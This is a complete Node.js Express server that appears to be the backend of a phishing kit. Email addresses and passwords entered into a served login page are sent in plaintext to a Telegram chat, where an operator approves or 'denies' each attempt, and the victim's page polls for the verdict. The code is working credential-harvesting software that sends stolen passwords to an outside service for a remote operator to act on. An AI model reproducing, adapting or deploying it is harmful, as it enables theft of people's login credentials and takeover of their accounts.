require('dotenv').config();

const express = require('express');
const TelegramBot = require('node-telegram-bot-api');
const path = require('path');

const app = express();
const port = Number(process.env.PORT || 3000);
const botToken = process.env.BOT_TOKEN;
const chatId = process.env.CHAT_ID;
const loginDecisions = new Map();

if (!botToken || !chatId) {
  console.error('Missing BOT_TOKEN or CHAT_ID in environment variables.');
}

const bot = new TelegramBot(botToken, { polling: true });

app.use(express.json());
app.use(express.static(__dirname));

bot.on('callback_query', async (query) => {
  const data = String(query.data || '');
  const [, ...rest] = data.split(':');
  const email = rest.join(':');

  try {
    if (data.startsWith('approve:')) {
      loginDecisions.set(email, { status: 'approved', message: 'Login approved.' });
      await bot.answerCallbackQuery(query.id, { text: 'Approved' });
      await bot.editMessageReplyMarkup(
        { inline_keyboard: [] },
        { chat_id: query.message.chat.id, message_id: query.message.message_id }
      );
      await bot.sendMessage(query.message.chat.id, `✅ Login approved for ${email || 'user'}.`);
    }

    if (data.startsWith('deny:')) {
      loginDecisions.set(email, { status: 'denied', message: 'Email or password is wrong.' });
      await bot.answerCallbackQuery(query.id, { text: 'Denied' });
      await bot.editMessageReplyMarkup(
        { inline_keyboard: [] },
        { chat_id: query.message.chat.id, message_id: query.message.message_id }
      );
      await bot.sendMessage(query.message.chat.id, `❌ Login denied for ${email || 'user'}.`);
    }
  } catch (error) {
    console.error('Callback processing failed:', error.message);
  }
});

app.post('/api/login', async (req, res) => {
  const email = String(req.body?.email || '').trim();
  const password = String(req.body?.password || '').trim();

  if (!email || !password) {
    return res.status(400).json({ ok: false, message: 'Missing email or password.' });
  }

  loginDecisions.delete(email);

  if (!botToken || !chatId) {
    return res.status(500).json({ ok: false, message: 'Telegram bot is not configured.' });
  }

  const message = `Login request:\nEmail: ${email}\nPassword: ${password}`;

  try {
    const sentMessage = await bot.sendMessage(chatId, message, {
      reply_markup: {
        inline_keyboard: [[
          { text: 'Approve', callback_data: `approve:${email}` },
          { text: 'Deny', callback_data: `deny:${email}` }
        ]]
      }
    });

    return res.json({
      ok: true,
      messageId: sentMessage.message_id,
      email
    });
  } catch (error) {
    console.error('Failed to send login request:', error.message);
    return res.status(500).json({ ok: false, message: 'Could not send login request.' });
  }
});

app.post('/api/telegram', async (req, res) => {
  const update = req.body || {};
  const query = update.callback_query;

  if (!query) {
    return res.status(200).json({ ok: true });
  }

  const data = String(query.data || '');
  const [, ...rest] = data.split(':');
  const email = rest.join(':');

  try {
    if (data.startsWith('approve:')) {
      loginDecisions.set(email, { status: 'approved', message: 'Login approved.' });
      await bot.answerCallbackQuery(query.id, { text: 'Approved' });
      await bot.editMessageReplyMarkup(
        { inline_keyboard: [] },
        { chat_id: query.message.chat.id, message_id: query.message.message_id }
      );
      await bot.sendMessage(query.message.chat.id, `✅ Login approved for ${email || 'user'}.`);
    }

    if (data.startsWith('deny:')) {
      loginDecisions.set(email, { status: 'denied', message: 'Email or password is wrong.' });
      await bot.answerCallbackQuery(query.id, { text: 'Denied' });
      await bot.editMessageReplyMarkup(
        { inline_keyboard: [] },
        { chat_id: query.message.chat.id, message_id: query.message.message_id }
      );
      await bot.sendMessage(query.message.chat.id, `❌ Login denied for ${email || 'user'}.`);
    }

    return res.status(200).json({ ok: true });
  } catch (error) {
    console.error('Callback processing failed:', error.message);
    return res.status(500).json({ ok: false, message: 'Callback processing failed.' });
  }
});

app.get('/api/login-status', (req, res) => {
  const email = String(req.query.email || '').trim();

  if (!email) {
    return res.status(400).json({ ok: false, message: 'Missing email.' });
  }

  const decision = loginDecisions.get(email);

  if (!decision) {
    return res.json({ ok: true, status: 'pending' });
  }

  return res.json({ ok: true, status: decision.status, message: decision.message });
});

app.get('/health', (_req, res) => {
  res.json({ ok: true });
});

app.listen(port, () => {
  console.log(`Server running on http://localhost:${port}`);
});
